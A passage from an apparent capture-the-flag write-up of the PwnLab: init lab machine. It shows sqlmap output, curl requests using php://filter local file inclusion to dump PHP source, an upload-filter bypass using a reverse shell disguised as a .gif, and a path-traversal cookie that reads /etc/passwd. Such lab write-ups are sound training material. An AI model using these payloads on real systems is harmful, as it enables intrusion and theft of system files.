</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> legal disclaimer: Usage of sqlmap <span class="k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="p">&amp;</span>rsquo<span class="p">;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> starting at 22:37:40&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching current user
</span><span class='line'>current user:    <span class="p">&amp;</span>lsquo<span class="p">;</span>root@%<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> current user is DBA
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching current user
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>_mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1142, <span class="p">&amp;</span>ldquo<span class="p">;</span>SELECT <span class="nb">command </span>denied to user <span class="p">&amp;</span>lsquo<span class="p">;</span>root<span class="p">&amp;</span>rsquo<span class="p">;</span>@<span class="p">&amp;</span>lsquo<span class="p">;</span>10.1.1.132<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="k">for</span> table <span class="p">&amp;</span>lsquo<span class="p">;</span>user<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'>current user is DBA:    False
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> shutting down at 22:37:40
</span></code></pre></td></tr></table></div></figure></p>

<p>Due to the current user is not DBA, I could not write file via MySQL ROOT account.</p>

<p>After login as user <code>kane</code>, I&rsquo;m trying to upload <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">php reverse shell</a>, but the web application only accept image files.</p>

<p><img class="left" src="/downloads/pwnlab_init/1.png"></p>

<p>In order to bypass the file extention limit, I downloaded the file <code>upload.php</code> by using the previouse LFI exploition method.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.140/?page=php://filter/convert.base64-encode/resource=upload&quot;</span>&gt;http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>upload&lt;/a&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://f4l13n5n0w.github.io/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCmlmICghaXNzZXQoJF9TRVNTSU9OWyd1c2VyJ10pKSB7IGRpZSgnWW91IG11c3QgYmUgbG9nIGluLicpOyB9DQo/Pg0KPGh0bWw+DQoJPGJvZHk+DQoJCTxmb3JtIGFjdGlvbj0nJyBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPg0KCQkJPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2ZpbGUnIGlkPSdmaWxlJyAvPg0KCQkJPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJy8+DQoJCTwvZm9ybT4NCgk8L2JvZHk+DQo8L2h0bWw+DQo8P3BocCANCmlmKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7DQoJaWYgKCRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA8PSAwKSB7DQoJCSRmaWxlbmFtZSAgPSAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXTsNCgkJJGZpbGV0eXBlICA9ICRfRklMRVNbJ2ZpbGUnXVsndHlwZSddOw0KCQkkdXBsb2FkZGlyID0gJ3VwbG9hZC8nOw0KCQkkZmlsZV9leHQgID0gc3RycmNocigkZmlsZW5hbWUsICcuJyk7DQoJCSRpbWFnZWluZm8gPSBnZXRpbWFnZXNpemUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddKTsNCgkJJHdoaXRlbGlzdCA9IGFycmF5KCIuanBnIiwiLmpwZWciLCIuZ2lmIiwiLnBuZyIpOyANCg0KCQlpZiAoIShpbl9hcnJheSgkZmlsZV9leHQsICR3aGl0ZWxpc3QpKSkgew0KCQkJZGllKCdOb3QgYWxsb3dlZCBleHRlbnNpb24sIHBsZWFzZSB1cGxvYWQgaW1hZ2VzIG9ubHkuJyk7DQoJCX0NCg0KCQlpZihzdHJwb3MoJGZpbGV0eXBlLCdpbWFnZScpID09PSBmYWxzZSkgew0KCQkJZGllKCdFcnJvciAwMDEnKTsNCgkJfQ0KDQoJCWlmKCRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvZ2lmJyAmJiAkaW1hZ2VpbmZvWydtaW1lJ10gIT0gJ2ltYWdlL2pwZWcnICYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvanBnJyYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvcG5nJykgew0KCQkJZGllKCdFcnJvciAwMDInKTsNCgkJfQ0KDQoJCWlmKHN1YnN0cl9jb3VudCgkZmlsZXR5cGUsICcvJyk+MSl7DQoJCQlkaWUoJ0Vycm9yIDAwMycpOw0KCQl9DQoNCgkJJHVwbG9hZGZpbGUgPSAkdXBsb2FkZGlyIC4gbWQ1KGJhc2VuYW1lKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkuJGZpbGVfZXh0Ow0KDQoJCWlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkdXBsb2FkZmlsZSkpIHsNCgkJCWVjaG8gIjxpbWcgc3JjPVwiIi4kdXBsb2FkZmlsZS4iXCI+PGJyIC8+IjsNCgkJfSBlbHNlIHsNCgkJCWRpZSgnRXJyb3IgNCcpOw0KCQl9DQoJfQ0KfQ0KDQo/Pg<span class="o">==</span>&lt;/center&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/body&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>After decoded the base64 code, I got the following <code>upload.php</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php
</span><span class='line'>session_start<span class="o">()</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$&lt;</span>em&gt;SESSION<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>user<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">]))</span> <span class="o">{</span> die<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>You must be log in.<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span>
</span><span class='line'>?&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>    &lt;body&gt;
</span><span class='line'>        &lt;form <span class="nv">action</span><span class="o">=</span><span class="s1">&#39;&#39;</span> <span class="nv">method</span><span class="o">=</span><span class="s1">&#39;post&#39;</span> <span class="nv">enctype</span><span class="o">=</span><span class="s1">&#39;multipart/form-data&#39;</span>&gt;
</span><span class='line'>            &lt;input <span class="nb">type</span><span class="o">=</span><span class="s1">&#39;file&#39;</span> <span class="nv">name</span><span class="o">=</span><span class="s1">&#39;file&#39;</span> <span class="nv">id</span><span class="o">=</span><span class="s1">&#39;file&#39;</span> /&gt;
</span><span class='line'>            &lt;input <span class="nb">type</span><span class="o">=</span><span class="s1">&#39;submit&#39;</span> <span class="nv">name</span><span class="o">=</span><span class="s1">&#39;submit&#39;</span> <span class="nv">value</span><span class="o">=</span><span class="s1">&#39;Upload&#39;</span>/&gt;
</span><span class='line'>        &lt;/form&gt;
</span><span class='line'>    &lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php
</span><span class='line'><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$&lt;</span>/em&gt;POST<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>submit<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">]))</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="nv">$&lt;</span>em&gt;FILES<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>file<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">][</span><span class="p">&amp;</span>lsquo<span class="p">;</span>error<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">]</span> <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span> 0<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$&lt;</span>/em&gt;FILES<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>file<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">][</span><span class="p">&amp;</span>lsquo<span class="p">;</span>name<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">]</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$filetype</span>  <span class="o">=</span> <span class="nv">$&lt;</span>em&gt;FILES<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>file<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">][</span><span class="p">&amp;</span>lsquo<span class="p">;</span><span class="nb">type</span><span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">]</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>upload/<span class="p">&amp;</span>rsquo<span class="p">;;</span>
</span><span class='line'>        <span class="nv">$file_ext</span>  <span class="o">=</span> strrchr<span class="o">(</span><span class="nv">$filename</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>.<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$imageinfo</span> <span class="o">=</span> getimagesize<span class="o">(</span><span class="nv">$&lt;</span>/em&gt;FILES<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>file<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">][</span><span class="p">&amp;</span>lsquo<span class="p">;</span>tmp_name<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">])</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$whitelist</span> <span class="o">=</span> array<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>.jpg<span class="p">&amp;</span>rdquo<span class="p">;</span>,<span class="p">&amp;</span>ldquo<span class="p">;</span>.jpeg<span class="p">&amp;</span>rdquo<span class="p">;</span>,<span class="p">&amp;</span>ldquo<span class="p">;</span>.gif<span class="p">&amp;</span>rdquo<span class="p">;</span>,<span class="p">&amp;</span>ldquo<span class="p">;</span>.png<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    <span class="k">if</span> <span class="o">(</span>!<span class="o">(</span>in_array<span class="o">(</span><span class="nv">$file_ext</span>, <span class="nv">$whitelist</span><span class="o">)))</span> <span class="o">{</span>
</span><span class='line'>        die<span class="o">(</span><span class="s1">&#39;Not allowed extension, please upload images only.&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="o">(</span>strpos<span class="o">(</span><span class="nv">$filetype</span>,<span class="s1">&#39;image&#39;</span><span class="o">)</span> <span class="o">===</span> <span class="nb">false</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        die<span class="o">(</span><span class="s1">&#39;Error 001&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="o">(</span><span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/gif&#39;</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/jpeg&#39;</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/jpg&#39;</span><span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/png&#39;</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        die<span class="o">(</span><span class="s1">&#39;Error 002&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="o">(</span>substr_count<span class="o">(</span><span class="nv">$filetype</span>, <span class="s1">&#39;/&#39;</span><span class="o">)</span><span class="p">&amp;</span>gt<span class="p">;</span>1<span class="o">){</span>
</span><span class='line'>        die<span class="o">(</span><span class="s1">&#39;Error 003&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> . md5<span class="o">(</span>basename<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;name&#39;</span><span class="o">]))</span>.<span class="nv">$file_ext</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span>move_uploaded_file<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="o">]</span>, <span class="nv">$uploadfile</span><span class="o">))</span> <span class="o">{</span>
</span><span class='line'>        <span class="nb">echo</span> <span class="s2">&quot;&amp;lt;img src=\&quot;&quot;</span>.<span class="nv">$uploadfile</span>.<span class="s2">&quot;\&quot;&amp;gt;&amp;lt;br /&amp;gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>        die<span class="o">(</span><span class="s1">&#39;Error 4&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">}</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;?&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Here, this <code>***.gif</code> file is the php reverse shell.</p>

<p><img class="left" src="/downloads/pwnlab_init/2.png"></p>

<p>Now the evil php has been uploaded and I have to find a way to trigger it. So I download the <code>index.php</code> to have a check.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.140/?page=php://filter/convert.base64-encode/resource=index&quot;</span>&gt;http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>index&lt;/a&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://f4l13n5n0w.github.io/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlzc2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4<span class="o">=</span>&lt;/center&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php
</span><span class='line'>//Multilingual. Not implemented yet.
</span><span class='line'>//setcookie<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>lang<span class="p">&amp;</span>rdquo<span class="p">;</span>,<span class="p">&amp;</span>ldquo<span class="p">;</span>en.lang.php<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$&lt;</span>em&gt;COOKIE<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>lang<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">]))</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>    include<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>lang/<span class="p">&amp;</span>rdquo<span class="p">;</span>.<span class="nv">$&lt;</span>/em&gt;COOKIE<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>lang<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">])</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>// Not implemented yet.
</span><span class='line'>?&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://f4l13n5n0w.github.io/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>&lt;?php
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;page&#39;</span><span class="o">]))</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        include<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;page&#39;</span><span class="o">]</span>.<span class="s2">&quot;.php&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="nb">echo</span> <span class="s2">&quot;Use this server to upload and share image files inside the intranet&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>?&gt;
</span><span class='line'>&lt;/center&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code of <code>index.php</code>, I noticed another one LFI vulnerability on <code>set cookie</code> header.</p>

<p>so in order to approve this LFI is working, I requested the <code>index.php</code> file and used <code>burp proxy</code> to modify <code>Cookie</code> header as follow:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>GET /index.php HTTP/1.1
</span><span class='line'>Host: 10.1.1.140
</span><span class='line'>User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:45.0<span class="o">)</span> Gecko/20100101 Firefox/45.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,&lt;em&gt;/&lt;/em&gt;<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
</span><span class='line'>Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>Cookie: <span class="nv">lang</span><span class="o">=</span>../../../../../../../../../etc/passwd
</span><span class='line'>Connection: close
</span></code></pre></td></tr></table></div></figure></p>

